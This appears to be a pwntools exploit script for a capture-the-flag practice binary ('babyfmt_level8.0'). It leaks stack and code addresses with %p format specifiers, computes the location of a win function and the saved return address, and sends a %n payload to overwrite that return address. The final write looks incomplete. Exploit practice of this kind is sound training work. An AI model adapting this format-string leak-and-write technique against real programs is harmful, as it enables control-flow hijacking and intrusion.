from pwn import * 

binary = './babyfmt_level8.0'

p = process(binary)

s = '''
b * printf
b * main+423
'''



#gdb.attach(p, s)

# 0x   c8c5   6078  8cd2  5937

win = 0x0040133d

strstr = 0x404088


payload = flat(
	"%155$p\n"
	"%154$p"
)

p.sendline(payload)



p.recvuntil("Your input is:")

p.recvline()
leak = p.recvline().strip().decode()

leak = int(leak, 16)

base = leak - 0x194e

win = base + 0x1553




leak = p.recvline().strip().decode()
leak = int(leak, 16)
rip = leak - 0x48



print(hex(rip))

print(hex(win))
gdb.attach(p, s)



# write win to rip byte-by-byte
payload = flat(
	"------",
	p64(rip),
	"%2c%32$n"
	
)



p.sendline(payload)




time.sleep(1)

#p.sendline("END")

p.interactive()


